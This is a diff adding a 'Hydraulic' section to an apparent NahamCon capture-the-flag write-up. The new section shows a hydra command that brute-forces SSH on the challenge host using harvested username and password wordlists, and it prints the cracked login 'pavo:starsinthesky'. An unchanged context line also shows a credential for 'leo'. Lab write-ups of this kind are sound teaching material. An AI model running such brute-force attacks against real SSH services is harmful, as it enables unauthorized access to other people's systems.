@@ -144,3 +144,19 @@ A password for Leo is constelleorising
 There are our flag 🥂
 
 >NOTE: possible credential:</br>leo:constelleorising
+
+## Hydraulic
+
+After seeing the name we can imediately think about [hydra](https://tools.kali.org/password-attacks/hydra)
+
+Since there was wordlist of username and password we took from *Lyra*, we can use that to bruteforce ssh
+
+```
+$ hydra -L ./username.txt -P ./password.txt ssh://challenge.nahamcon.com:[PORT]
+```
+
+```
+[31975][ssh] host: challenge.nahamcon.com   login: pavo   password: starsinthesky
+```
+
+Login the machine with ssh and get the *flag* 👏
